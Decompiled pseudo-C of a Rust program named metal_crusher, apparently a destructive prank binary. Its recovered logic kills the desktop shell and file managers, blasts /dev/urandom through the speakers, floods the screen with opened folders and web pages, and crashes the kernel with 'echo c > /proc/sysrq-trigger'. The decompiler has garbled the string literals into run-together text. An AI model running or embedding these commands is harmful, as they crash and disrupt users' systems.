char metal_crusher::main()
{
    int v0;  // [bp-0x268], Other Possible Types: char, unsigned long long
    int v1;  // [bp-0x268]
    unsigned long long v2;  // [bp-0x260]
    char *v3;  // [bp-0x258], Other Possible Types: unsigned long long
    unsigned long long v4;  // [bp-0x250]
    void* v5;  // [bp-0x248], Other Possible Types: unsigned long long
    char v6;  // [bp-0x240], Other Possible Types: unsigned long long
    unsigned long long v7;  // [bp-0x240]
    unsigned long long v8;  // [bp-0x240]
    unsigned long long v9;  // [bp-0x240]
    unsigned int v10;  // [bp-0x23f]
    unsigned short v11;  // [bp-0x23b]
    char v12;  // [bp-0x239]
    unsigned long long v13;  // [bp-0x238]
    unsigned long long v14;  // [bp-0x230]
    unsigned long long v15;  // [bp-0x228]
    unsigned long long v16;  // [bp-0x220]
    void* v17;  // [bp-0x218]
    unsigned long long v18;  // [bp-0x210]
    unsigned long long v19;  // [bp-0x208]
    int v20;  // [bp-0x1f8], Other Possible Types: char *
    unsigned long long v21;  // [bp-0x1f0]
    unsigned long long v22;  // [bp-0x1e8]
    void* v25;  // [bp-0x1b8]
    unsigned long long v26;  // [bp-0x1a8]
    unsigned long long v27;  // [bp-0x1a0]
    unsigned long long v28;  // [bp-0x198]
    char v29;  // [bp-0x190]
    unsigned int v30;  // [bp-0x18f]
    unsigned short v31;  // [bp-0x18b]
    char v32;  // [bp-0x189]
    char v40;  // [bp-0x148]
    unsigned long long v41;  // [bp-0x140]
    unsigned long long v42;  // [bp-0x138]
    char v46;  // [bp-0xf8]
    int v48;  // [bp-0xc8]
    unsigned long long v49;  // [bp-0xb8]
    int v50;  // [bp-0xb0]
    unsigned long long v51;  // [bp-0xa0]
    unsigned long long v58;  // rax
    unsigned long long v59;  // rdx
    unsigned long long v60;  // rax
    unsigned long long v61;  // rax
    unsigned int v62;  // ebx
    unsigned int v63;  // ebx
    unsigned long long v64;  // rax
    unsigned int v65;  // ebx
    unsigned int v66;  // ebx

    std::env::args(&v0);
    v40.collect(&v0);
    v0.to_vec();
    v22 = v3;
    *((int128_t *)&v20) = *((int128_t *)&v0);
    v46.unwrap(&(char)v20);
    if (v46.slice_contains(v41, v42))
    {
        ::0x7956f0::core::ptr::drop_in_place<alloc::string::String>(&v46);
        std::thread::sleep(108, 0);
        metal_crusher::fun::execute_shell("cat /dev/urandom | aplayecho c > /proc/sysrq-trigger", 24);
        std::thread::sleep(1, 0);
        metal_crusher::fun::execute_shell("echo c > /proc/sysrq-trigger", 28);
        return ::0x795ba0::core::ptr::drop_in_place<alloc::vec::Vec<alloc::string::String>>(&v40);
    }
    ::0x7956f0::core::ptr::drop_in_place<alloc::string::String>(&v46);
    v26 = 0x8000000000000000;
    v25 = 0;
    v29 = 0;
    v5 = v28;
    v6 = 0;
    v10 = v30;
    v11 = v31;
    v12 = v32;
    v3 = v26;
    v4 = v27;
    *((int128_t *)&v0) = *((int128_t *)&v25);
    (char)v20.spawn_unchecked(&v0);
    v0.expect(&(char)v20);
    ::0x795b40::core::ptr::drop_in_place<std::thread::JoinHandle<()>>(&v0);
    metal_crusher::music::play_audio();
    metal_crusher::fun::notify("Fun things will happen soon:Dxdg-open /xdg-open /binxdg-open /libxdg-open /homexdg-open /tmpls /tmp; sleep 2000ls /bin; sleep 2000ls /usr; sleep 2000ls /etc; sleep 2000xdg-open /devxdg-open /sbinxdg-open /runxdg-open /sysxdg-open /proctree /home; sleep 200", 27, ":Dxdg-open /xdg-open /binxdg-open /libxdg-open /homexdg-open /tmpls /tmp; sleep 2000ls /bin; sleep 2000ls /usr; sleep 2000ls /etc; sleep 2000xdg-open /devxdg-open /sbinxdg-open /runxdg-open /sysxdg-open /proctree /home; sleep 2000xdg-open https://www.youtu", 2);
    std::thread::sleep(1, 0);
    metal_crusher::fun::notify("Fun things will happen soon:Dxdg-open /xdg-open /binxdg-open /libxdg-open /homexdg-open /tmpls /tmp; sleep 2000ls /bin; sleep 2000ls /usr; sleep 2000ls /etc; sleep 2000xdg-open /devxdg-open /sbinxdg-open /runxdg-open /sysxdg-open /proctree /home; sleep 200", 27, ":Dxdg-open /xdg-open /binxdg-open /libxdg-open /homexdg-open /tmpls /tmp; sleep 2000ls /bin; sleep 2000ls /usr; sleep 2000ls /etc; sleep 2000xdg-open /devxdg-open /sbinxdg-open /runxdg-open /sysxdg-open /proctree /home; sleep 2000xdg-open https://www.youtu", 2);
    std::thread::sleep(0, 0x17d78400);
    v19 = metal_crusher::fun::detect_terminal();
    std::thread::sleep(2, 0x11e1a300);
    while (true)
    {
        v0 = "xdg-open /xdg-open /binxdg-open /libxdg-open /homexdg-open /tmpls /tmp; sleep 2000ls /bin; sleep 2000ls /usr; sleep 2000ls /etc; sleep 2000xdg-open /devxdg-open /sbinxdg-open /runxdg-open /sysxdg-open /proctree /home; sleep 2000xdg-open https://www.youtube";
        v2 = 10;
        v3 = "xdg-open /binxdg-open /libxdg-open /homexdg-open /tmpls /tmp; sleep 2000ls /bin; sleep 2000ls /usr; sleep 2000ls /etc; sleep 2000xdg-open /devxdg-open /sbinxdg-open /runxdg-open /sysxdg-open /proctree /home; sleep 2000xdg-open https://www.youtube.com/@notr";
        v4 = 13;
        v5 = "xdg-open /libxdg-open /homexdg-open /tmpls /tmp; sleep 2000ls /bin; sleep 2000ls /usr; sleep 2000ls /etc; sleep 2000xdg-open /devxdg-open /sbinxdg-open /runxdg-open /sysxdg-open /proctree /home; sleep 2000xdg-open https://www.youtube.com/@notrltxdg-open ht";
        v7 = 13;
        v13 = "xdg-open /homexdg-open /tmpls /tmp; sleep 2000ls /bin; sleep 2000ls /usr; sleep 2000ls /etc; sleep 2000xdg-open /devxdg-open /sbinxdg-open /runxdg-open /sysxdg-open /proctree /home; sleep 2000xdg-open https://www.youtube.com/@notrltxdg-open https://www.goo";
        v14 = 14;
        v15 = "xdg-open /tmpls /tmp; sleep 2000ls /bin; sleep 2000ls /usr; sleep 2000ls /etc; sleep 2000xdg-open /devxdg-open /sbinxdg-open /runxdg-open /sysxdg-open /proctree /home; sleep 2000xdg-open https://www.youtube.com/@notrltxdg-open https://www.google.com/search";
        v16 = 13;
        v17 = 0;
        v18 = 5;
        while (true)
        {
            v58 = v0.next();
            if (!v58)
                break;
            metal_crusher::fun::execute_shell(v58, v59);
            std::thread::sleep(0, 0x23c34600);
        }
        core::ptr::drop_in_place<core::array::iter::IntoIter<&str,5_usize>>();
        v0 = "ls /; sleep 2000";
        v2 = 16;
        v3 = "ls /tmp; sleep 2000ls /bin; sleep 2000ls /usr; sleep 2000ls /etc; sleep 2000xdg-open /devxdg-open /sbinxdg-open /runxdg-open /sysxdg-open /proctree /home; sleep 2000xdg-open https://www.youtube.com/@notrltxdg-open https://www.google.com/search?q=linuxxdg-o";
        v4 = 19;
        v5 = "ls /bin; sleep 2000ls /usr; sleep 2000ls /etc; sleep 2000xdg-open /devxdg-open /sbinxdg-open /runxdg-open /sysxdg-open /proctree /home; sleep 2000xdg-open https://www.youtube.com/@notrltxdg-open https://www.google.com/search?q=linuxxdg-open https://2ip.iox";
        v8 = 19;
        v13 = "ls /usr; sleep 2000ls /etc; sleep 2000xdg-open /devxdg-open /sbinxdg-open /runxdg-open /sysxdg-open /proctree /home; sleep 2000xdg-open https://www.youtube.com/@notrltxdg-open https://www.google.com/search?q=linuxxdg-open https://2ip.ioxdg-open https://git";
        v14 = 19;
        v15 = "ls /etc; sleep 2000xdg-open /devxdg-open /sbinxdg-open /runxdg-open /sysxdg-open /proctree /home; sleep 2000xdg-open https://www.youtube.com/@notrltxdg-open https://www.google.com/search?q=linuxxdg-open https://2ip.ioxdg-open https://github.com/relativemod";
        v16 = 19;
        v17 = 0;
        v18 = 5;
        while (true)
        {
            v60 = v0.next();
            if (!v60)
                break;
            metal_crusher::fun::run_in_terminal(v19, v59, v60, v59);
            std::thread::sleep(0, 0x23c34600);
        }
        core::ptr::drop_in_place<core::array::iter::IntoIter<&str,5_usize>>();
        metal_crusher::fun::destroy_gui_shell();
        metal_crusher::fun::destroy_file_managers();
        v20 = &v19;
        v21 = <&T as core::fmt::Display>::fmt;
        *((unsigned long long **)&v1) = &g_997680;
        v2 = 1;
        v5 = 0;
        v3 = &v20;
        v4 = 1;
        v48.map_or_else(&(unsigned long long)v1);
        v1 = v48;
        v3 = v49;
        metal_crusher::fun::execute_shell(1, v49);
        ::0x7956f0::core::ptr::drop_in_place<alloc::string::String>(&(unsigned long long)v1);
        std::thread::sleep(1, 0xbebc200);
        metal_crusher::fun::reanimate_gui_shell();
        v0 = "xdg-open /devxdg-open /sbinxdg-open /runxdg-open /sysxdg-open /proctree /home; sleep 2000xdg-open https://www.youtube.com/@notrltxdg-open https://www.google.com/search?q=linuxxdg-open https://2ip.ioxdg-open https://github.com/relativemodder/metal-crusherxd";
        v2 = 13;
        v3 = "xdg-open /sbinxdg-open /runxdg-open /sysxdg-open /proctree /home; sleep 2000xdg-open https://www.youtube.com/@notrltxdg-open https://www.google.com/search?q=linuxxdg-open https://2ip.ioxdg-open https://github.com/relativemodder/metal-crusherxdg-open https:";
        v4 = 14;
        v5 = "xdg-open /runxdg-open /sysxdg-open /proctree /home; sleep 2000xdg-open https://www.youtube.com/@notrltxdg-open https://www.google.com/search?q=linuxxdg-open https://2ip.ioxdg-open https://github.com/relativemodder/metal-crusherxdg-open https://www.newgroun";
        v9 = 13;
        v13 = "xdg-open /sysxdg-open /proctree /home; sleep 2000xdg-open https://www.youtube.com/@notrltxdg-open https://www.google.com/search?q=linuxxdg-open https://2ip.ioxdg-open https://github.com/relativemodder/metal-crusherxdg-open https://www.newgrounds.com/audio/";
        v14 = 13;
        v15 = "xdg-open /proctree /home; sleep 2000xdg-open https://www.youtube.com/@notrltxdg-open https://www.google.com/search?q=linuxxdg-open https://2ip.ioxdg-open https://github.com/relativemodder/metal-crusherxdg-open https://www.newgrounds.com/audio/listen/141348";
        v16 = 14;
        v17 = 0;
        v18 = 5;
        while (true)
        {
            v61 = v0.next();
            if (!v61)
                break;
            metal_crusher::fun::execute_shell(v61, v59);
            std::thread::sleep(0, 0x23c34600);
        }
        core::ptr::drop_in_place<core::array::iter::IntoIter<&str,5_usize>>();
        metal_crusher::fun::run_in_terminal(v19, v59, "tree /home; sleep 2000xdg-open https://www.youtube.com/@notrltxdg-open https://www.google.com/search?q=linuxxdg-open https://2ip.ioxdg-open https://github.com/relativemodder/metal-crusherxdg-open https://www.newgrounds.com/audio/listen/1413480ps aux; sleep", 22);
        std::thread::sleep(0, 0x23c34600);
        v62 = 4;
        while (true)
        {
            v63 = v62 - 1;
            if (v62 == 1)
                break;
            metal_crusher::fun::run_in_terminal(v19, v59, "ps aux; sleep 2000cat /dev/urandom | aplayecho c > /proc/sysrq-trigger", 18);
            std::thread::sleep(0, 0x23c34600);
            v62 = v63;
        }
        v20 = &v19;
        v21 = <&T as core::fmt::Display>::fmt;
        *((unsigned long long **)&v1) = &g_997680;
        v2 = 1;
        v5 = 0;
        v3 = &v20;
        v4 = 1;
        v50.map_or_else(&(unsigned long long)v1);
        v1 = v50;
        v3 = v51;
        metal_crusher::fun::execute_shell(1, v51);
        ::0x7956f0::core::ptr::drop_in_place<alloc::string::String>(&(unsigned long long)v1);
        std::thread::sleep(1, 0xbebc200);
        metal_crusher::fun::destroy_file_managers();
        std::thread::sleep(2, 0);
        metal_crusher::fun::toggle_desktop_overview();
        metal_crusher::fun::put_random_shit_on_desktop();
        metal_crusher::fun::toggle_desktop_overview();
        *((char **)&v0) = "xdg-open https://www.youtube.com/@notrltxdg-open https://www.google.com/search?q=linuxxdg-open https://2ip.ioxdg-open https://github.com/relativemodder/metal-crusherxdg-open https://www.newgrounds.com/audio/listen/1413480ps aux; sleep 2000cat /dev/urandom ";
        v2 = 40;
        v3 = "xdg-open https://www.google.com/search?q=linuxxdg-open https://2ip.ioxdg-open https://github.com/relativemodder/metal-crusherxdg-open https://www.newgrounds.com/audio/listen/1413480ps aux; sleep 2000cat /dev/urandom | aplayecho c > /proc/sysrq-trigger";
        v4 = 46;
        v5 = "xdg-open https://2ip.ioxdg-open https://github.com/relativemodder/metal-crusherxdg-open https://www.newgrounds.com/audio/listen/1413480ps aux; sleep 2000cat /dev/urandom | aplayecho c > /proc/sysrq-trigger";
        v6 = 23;
        v13 = "xdg-open https://github.com/relativemodder/metal-crusherxdg-open https://www.newgrounds.com/audio/listen/1413480ps aux; sleep 2000cat /dev/urandom | aplayecho c > /proc/sysrq-trigger";
        v14 = 56;
        v15 = "xdg-open https://www.newgrounds.com/audio/listen/1413480ps aux; sleep 2000cat /dev/urandom | aplayecho c > /proc/sysrq-trigger";
        v16 = 56;
        v17 = 0;
        v18 = 5;
        while (true)
        {
            v64 = (unsigned long long)v0.next();
            if (!v64)
                break;
            metal_crusher::fun::execute_shell(v64, v59);
            metal_crusher::fun::execute_shell(1, 0);
            std::thread::sleep(1, 0x1dcd6500);
        }
        core::ptr::drop_in_place<core::array::iter::IntoIter<&str,5_usize>>();
        std::thread::sleep(0, 0x1dcd6500);
        v65 = 8;
        while (true)
        {
            v66 = v65 - 1;
            if (v65 == 1)
                break;
            std::thread::sleep(0, 0xbebc200);
            metal_crusher::fun::toggle_desktop_overview();
            v65 = v66;
        }
        std::thread::sleep(3, 0x1dcd6500);
    }
}
